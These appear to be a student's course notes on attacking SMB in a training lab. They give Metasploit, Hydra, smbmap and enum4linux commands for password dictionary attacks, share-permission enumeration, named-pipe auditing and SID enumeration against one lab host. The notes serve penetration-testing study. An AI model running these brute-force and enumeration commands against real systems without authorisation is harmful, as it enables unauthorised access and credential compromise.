- Most of what has been covered up till now in the course involves NULL logins, or anonymous logins, as they are more famously known as.
- But there are cases where such misconfigurations are not be found, in such scenarios we can use dictionary attacks with wordlists of known passwords to try to find the credentials in use.
- The most used wordlist in the course, and subsequently the exam will be rockyou.txt.

 SMB Dictionary Attacks using Metasploit
	- `msfconsole`
	- `use auxiliary/scanner/smb/smb_login`
	- `show options`
	- `set RHOSTS 192.125.26.3`
	- `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
	- `set smbuser jane`
	- `show options`
	- `run`
	- `exit`

SMB Dictionary Attacks using Hydra
	- Decompressing the rockyou.txt wordlist file to use with Hydra: `gzip -d /usr/share/wordlists/rockyou.txt.gz`
	- Using Hydra to perform the dictionary attack: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.125.26.3 smb`
	- In Hydra, lowercase flags are used to specify unique values entered along with the command, like admin for username in the command above, and uppercase values are used to pass an input file to use instead.
	- The protocol to target for the attack needs to be specified in the command as well.

SMB User Access Permission Enumeration using smbmap
	- `smbmap -H 192.125.26.3 -u admin -p password1`

SMB is a protocol that can be used for many different services, the way services talk to one another through pipes, names pipes are pipes that are known. If we can get into SMB, there is a chance that we can get into other services that are piped through it.

SMB pipes enumeration using Metasploit Framework
	- `msfconsole'
	- `use auxiliary/scanner/smb/pipe_auditor`
	- `set smbuser admin`
	- `set smbpass password1`
	- `set RHOSTS 192.125.26.3`
	- `show options`
	- `run`

Enumerating user SIDs with admin privilege using enum4linux
	- `enum4linux -r -u "admin" -p "password1" 192.125.26.3`
